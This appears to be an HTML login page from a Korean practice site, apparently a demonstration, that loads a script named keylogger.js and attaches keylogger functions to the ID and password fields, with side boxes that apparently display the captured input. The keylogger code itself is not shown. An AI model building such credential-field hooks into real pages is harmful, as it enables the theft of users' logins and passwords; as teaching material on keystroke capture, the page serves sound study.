<!DOCTYPE html>

<head>
    <title>SIGN IN</title>
    <meta content="charset=utf-8">
    <link rel="stylesheet" href="./style/main.css">
    <link rel="stylesheet" href="./style/sign_in.css">
    <script type = "text/javascript" src="./script/keylogger.js"></script>
</head>

<body>
    <div class = "sideBox">
        <div id = "result_id"></div>
        <div id = "result_pw"></div>
    </div>

    <div class = "headBox">
        <a class = "title" href="home.php">안녕하진않아요</a>
    </div>

    <div class = "bodyBox">
        <form action="login_proc.php">
            <input id = "id" name = "id" type="text" placeholder = "아이디" onkeyup="keylogger_id()">
            <input id = "pw" name = "pw" type="password" placeholder="비밀번호" onkeyup="keylogger_pw()">
            <button type="submit">LOG IN</button>
        </form>
    </div>

    <div class = "footBox">
        <nav>
            <a href="">아이디 찾기</a> | 
            <a href="">비밀번호 찾기</a> | 
            <a href="">회원가입</a>
        </nav>
    </div>
</body>

</html>